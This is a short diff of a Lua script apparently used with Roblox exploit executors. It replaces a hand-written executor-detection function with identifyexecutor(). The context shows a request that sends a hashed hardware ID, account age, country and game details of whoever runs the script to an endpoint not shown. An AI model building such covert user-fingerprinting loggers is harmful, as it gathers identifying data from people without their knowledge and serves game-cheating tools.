@@ -163,20 +163,6 @@ local function getHWID()
     return syn and syn.crypt.hash(syn.crypt.create(hwidString)) or "N/A"
 end
 
-local function getExecutor()
-    if game:GetService("AdService"):FindFirstChild("deltaontop") then
-        return "Delta"
-    elseif syn then
-        return "Synapse X"
-    elseif getfenv then
-        return "Krnl"
-    elseif isexecutor then
-        return "ProtoSmasher"
-    else
-        return "Unknown Executor"
-    end
-end
-
 local function getPSTTime()
     local utcTime = os.time()
     local pstOffset = 8 * 60 * 60
@@ -203,7 +189,7 @@ request({
                     { name = "Place ID", value = game.PlaceId },
                     { name = "Account Age", value = Players.LocalPlayer.AccountAge .. " days old" },
                     { name = "Country", value = LocalizationService:GetCountryRegionForPlayerAsync(Players.LocalPlayer) },
-                    { name = "Executor", value = getExecutor() },
+                    { name = "Executor", value = identifyexecutor() },  -- Directly call the function here
                     { name = "Server Size", value = #game.Players:GetPlayers() .. " players" },
                     { name = "Execution Time", value = getPSTTime() },
                 }
